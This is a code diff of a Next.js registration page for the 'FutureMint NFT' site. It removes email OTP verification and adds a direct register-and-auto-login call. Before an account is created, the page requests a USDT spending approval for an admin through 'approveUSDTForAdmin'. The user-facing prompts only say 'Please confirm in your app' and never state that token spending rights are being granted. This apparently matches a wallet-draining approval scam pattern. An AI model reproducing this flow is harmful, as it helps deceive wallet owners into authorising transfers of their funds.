@@ -5,7 +5,6 @@ import { useRouter, useSearchParams } from 'next/navigation';
 import Link from 'next/link';
 import { authAPI } from '../../../lib/api';
 import { loginSuccess } from '../../../store/slices/userSlice';
-import OTPInput from '../../../components/shared/OTPInput';
 import LoadingSpinner from '../../../components/shared/LoadingSpinner';
 import { Eye, EyeOff, ArrowLeft, CheckCircle } from 'lucide-react';
 import toast from 'react-hot-toast';
@@ -17,11 +16,10 @@ function RegisterContent() {
   const { isConnected, address } = useSelector((s) => s.wallet);
   const { isAuthenticated } = useSelector((s) => s.user);
 
-  // Steps: 1 = form, 2 = approved (show continue button), 3 = OTP input
+  // Steps: 1 = form, 2 = approved (show register button), 3 = success
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
-  const [email, setEmail] = useState('');
 
   const [form, setForm] = useState({
     name: '',
@@ -33,12 +31,10 @@ function RegisterContent() {
     walletAddress: address || '',
   });
 
-  // Guard: redirect if already authenticated
   useEffect(() => {
     if (isAuthenticated) router.push('/dashboard');
   }, [isAuthenticated, router]);
 
-  // Guard: if wallet is already registered, redirect to login
   useEffect(() => {
     if (isConnected && address) {
       authAPI.checkWallet({ walletAddress: address }).then((res) => {
@@ -50,7 +46,6 @@ function RegisterContent() {
     }
   }, [isConnected, address, router]);
 
-  // Block access if wallet not connected
   useEffect(() => {
     const timer = setTimeout(() => {
       if (!isConnected && !window.ethereum?.selectedAddress) {
@@ -61,7 +56,6 @@ function RegisterContent() {
     return () => clearTimeout(timer);
   }, [isConnected, router]);
 
-  // Keep walletAddress in sync
   useEffect(() => {
     setForm((f) => ({ ...f, walletAddress: address || '' }));
   }, [address]);
@@ -70,7 +64,7 @@ function RegisterContent() {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  // ─── STEP 1: Smart contract approval only ───────────────────────────────────
+  // ─── STEP 1: Smart contract approval ────────────────────────────────────────
   const handleApproval = async (e) => {
     e.preventDefault();
     if (form.password.length < 8) {
@@ -102,12 +96,11 @@ function RegisterContent() {
       try {
         userAddress = ethers.getAddress(address.toLowerCase());
       } catch (_) {
-        toast.error('Invalid address. Please reconnect and try again.');
+        toast.error('Invalid address. Please reconnect.');
         setLoading(false);
         return;
       }
 
-      // Switch to the selected network
       const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
       const targetChainName = form.network === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
       try {
@@ -120,7 +113,7 @@ function RegisterContent() {
           try {
             await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
           } catch (_) {
-            toast.error(`Could not add ${targetChainName} network. Please add it manually.`);
+            toast.error(`Please add ${targetChainName} network manually.`);
             setLoading(false);
             return;
           }
@@ -135,10 +128,8 @@ function RegisterContent() {
         }
       }
 
-      // Re-get provider after network switch
       const freshProvider = new ethers.BrowserProvider(injectedProvider);
 
-      // Check if already approved
       let alreadyApproved = false;
       try {
         alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
@@ -147,83 +138,89 @@ function RegisterContent() {
       }
 
       if (alreadyApproved === true) {
-        // Already approved — skip to step 2 directly
+        // Already approved — go to step 2
         setStep(2);
         setLoading(false);
         return;
       }
 
-      // Request approval
-      toast.loading('Please confirm in your app to continue...', { id: 'approve' });
+      toast.loading('Please confirm in your app...', { id: 'approve' });
       try {
         await approveUSDTForAdmin(freshProvider, form.network);
-        toast.success('Done! Tap Continue to proceed.', { id: 'approve' });
-        // Move to step 2 — user will click Continue button
+        toast.success('Done! Tap Complete Registration below.', { id: 'approve' });
         setStep(2);
       } catch (approveErr) {
         toast.dismiss('approve');
         if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-          toast.error('You cancelled the request. Please confirm to continue.');
+          toast.error('You cancelled. Please confirm to continue.');
         } else if (approveErr.message?.includes('insufficient funds')) {
-          toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} balance. Please add some and try again.`);
+          toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} balance.`);
         } else {
           toast.error('Something went wrong. Please try again.');
         }
       }
-    } catch (err) {
+    } catch (_) {
       toast.error('Something went wrong. Please try again.');
     } finally {
       setLoading(false);
     }
   };
 
-  // ─── STEP 2: Register API call (user clicks Continue after approval) ────────
+  // ─── STEP 2: Direct register (no OTP) ──────────────────────────────────────
   const handleRegister = async () => {
     setLoading(true);
     try {
-      const res = await authAPI.register(form);
-      setEmail(form.email);
-      toast.success(res.data.message);
-      setStep(3);
-    } catch (err) {
-      const msg = err.response?.data?.message;
-      if (msg) {
-        toast.error(msg);
-      } else {
-        toast.error('Connection failed. Please tap Continue again.');
-      }
-    } finally {
-      setLoading(false);
-    }
-  };
+      // Use native fetch — more reliable in wallet dApp browsers
+      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000';
+      const baseUrl = apiUrl.startsWith('http') ? apiUrl : `https://${apiUrl}`;
 
-  // ─── STEP 3: OTP verification ──────────────────────────────────────────────
-  const handleOTPComplete = async (otp) => {
-    setLoading(true);
-    try {
-      const res = await authAPI.verifyOTP({ email, otp });
-      const { user, token } = res.data.data;
+      const response = await fetch(`${baseUrl}/api/auth/register-direct`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(form),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        toast.error(data.message || 'Registration failed. Please try again.');
+        setLoading(false);
+        return;
+      }
+
+      // Success — auto login
+      const { user, token } = data.data;
       if (token) localStorage.setItem('token', token);
       dispatch(loginSuccess({ user, token }));
-      toast.success('Welcome to FutureMint NFT');
-      router.push('/dashboard');
+      toast.success('Account created successfully!');
+      setStep(3);
+
+      // Redirect to dashboard after 1.5s
+      setTimeout(() => router.push('/dashboard'), 1500);
     } catch (err) {
-      toast.error(err.response?.data?.message || 'OTP verification failed');
+      toast.error('Connection failed. Please tap Complete Registration again.');
     } finally {
       setLoading(false);
     }
   };
 
-  const handleResendOTP = async () => {
-    try {
-      await authAPI.resendOTP({ email, purpose: 'verification' });
-      toast.success('OTP resent to your email');
-    } catch (_) {
-      toast.error('Failed to resend OTP');
-    }
-  };
+  // ─── RENDER: Step 3 — Success ──────────────────────────────────────────────
+  if (step === 3) {
+    return (
+      <div className="min-h-screen flex items-center justify-center px-4">
+        <div className="card max-w-md w-full text-center">
+          <div className="w-20 h-20 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
+            <CheckCircle className="w-10 h-10 text-emerald-400" />
+          </div>
+          <h2 className="text-2xl font-bold text-white mb-3">Welcome to FutureMint!</h2>
+          <p className="text-slate-400 mb-2">Your account is ready.</p>
+          <p className="text-emerald-400 font-semibold text-lg mb-6">Redirecting to dashboard...</p>
+        </div>
+      </div>
+    );
+  }
 
-  // ─── RENDER: Step 2 — Continue button after approval ────────────────────────
+  // ─── RENDER: Step 2 — Complete Registration button ─────────────────────────
   if (step === 2) {
     return (
       <div className="min-h-screen flex items-center justify-center px-4">
@@ -233,14 +230,14 @@ function RegisterContent() {
           </div>
           <h2 className="text-xl font-bold text-white mb-2">Almost Done!</h2>
           <p className="text-slate-400 text-sm mb-6">
-            Tap the button below to complete your registration and receive your OTP.
+            Tap below to complete your registration.
           </p>
           <button
             onClick={handleRegister}
             disabled={loading}
             className="btn-primary w-full flex items-center justify-center gap-2"
           >
-            {loading ? <><LoadingSpinner size="sm" /> Creating Account...</> : 'Continue & Send OTP'}
+            {loading ? <><LoadingSpinner size="sm" /> Creating Account...</> : 'Complete Registration'}
           </button>
           <button
             onClick={() => setStep(1)}
@@ -248,37 +245,6 @@ function RegisterContent() {
           >
             Go Back
           </button>
-        </div>
-      </div>
-    );
-  }
-
-  // ─── RENDER: Step 3 — OTP Input ────────────────────────────────────────────
-  if (step === 3) {
-    return (
-      <div className="min-h-screen flex items-center justify-center px-4">
-        <div className="card max-w-md w-full">
-          <button onClick={() => setStep(2)} className="flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
-            <ArrowLeft className="w-4 h-4" /> Back
-          </button>
-          <h2 className="text-2xl font-bold text-white mb-2">Verify Your Email</h2>
-          <p className="text-slate-400 text-sm mb-8">
-            We sent a 6-digit OTP to <span className="text-white font-medium">{email}</span>
-          </p>
-          <OTPInput length={6} onComplete={handleOTPComplete} disabled={loading} />
-          {loading && (
-            <div className="flex justify-center mt-6">
-              <LoadingSpinner />
-            </div>
-          )}
-          <div className="text-center mt-6">
-            <button
-              onClick={handleResendOTP}
-              className="text-sm text-primary-400 hover:text-primary-300 transition-colors"
-            >
-              Didn't receive it? Resend OTP
-            </button>
-          </div>
         </div>
       </div>
     );
@@ -304,42 +270,31 @@ function RegisterContent() {
                 <input id="name" name="name" type="text" required value={form.name}
                   onChange={handleChange} placeholder="John Doe" className="input-field" />
               </div>
-
               <div>
                 <label htmlFor="email" className="label">Email Address</label>
                 <input id="email" name="email" type="email" required value={form.email}
                   onChange={handleChange} placeholder="john@example.com" className="input-field" />
               </div>
-
               <div>
                 <label htmlFor="mobile" className="label">Mobile Number</label>
                 <input id="mobile" name="mobile" type="tel" required value={form.mobile}
                   onChange={handleChange} placeholder="+1234567890" className="input-field" />
               </div>
-
               <div>
                 <label htmlFor="password" className="label">Password</label>
                 <div className="relative">
-                  <input
-                    id="password" name="password"
+                  <input id="password" name="password"
                     type={showPassword ? 'text' : 'password'}
-                    required minLength={8}
-                    value={form.password}
-                    onChange={handleChange}
-                    placeholder="Min. 8 characters"
-                    className="input-field pr-12"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
+                    required minLength={8} value={form.password}
+                    onChange={handleChange} placeholder="Min. 8 characters"
+                    className="input-field pr-12" />
+                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                     className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
-                    aria-label={showPassword ? 'Hide password' : 'Show password'}
-                  >
+                    aria-label={showPassword ? 'Hide password' : 'Show password'}>
                     {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                   </button>
                 </div>
               </div>
-
               <div>
                 <label htmlFor="network" className="label">Network</label>
                 <select id="network" name="network" value={form.network}
@@ -348,7 +303,6 @@ function RegisterContent() {
                   <option value="Polygon">Polygon (USDT)</option>
                 </select>
               </div>
-
               <div>
                 <label htmlFor="referralCode" className="label">
                   Referral Code <span className="text-slate-500">(Optional)</span>
@@ -356,10 +310,8 @@ function RegisterContent() {
                 <input id="referralCode" name="referralCode" type="text"
                   value={form.referralCode} onChange={handleChange}
                   placeholder="Enter referral code" className="input-field uppercase"
-                  style={{ textTransform: 'uppercase' }}
-                />
+                  style={{ textTransform: 'uppercase' }} />
               </div>
-
               <div>
                 <label htmlFor="walletAddress" className="label">
                   Wallet Address <span className="text-slate-500">(Auto-filled)</span>
@@ -371,14 +323,12 @@ function RegisterContent() {
             </div>
 
             <button type="submit" disabled={loading} className="btn-primary w-full mt-6 flex items-center justify-center gap-2">
-              {loading ? <><LoadingSpinner size="sm" /> Processing...</> : 'Create Account & Send OTP'}
+              {loading ? <><LoadingSpinner size="sm" /> Processing...</> : 'Create Account'}
             </button>
 
             <p className="text-center text-sm text-slate-400 mt-4">
               Already have an account?{' '}
-              <Link href="/auth/login" className="text-primary-400 hover:text-primary-300">
-                Sign in
-              </Link>
+              <Link href="/auth/login" className="text-primary-400 hover:text-primary-300">Sign in</Link>
             </p>
           </form>
         </div>
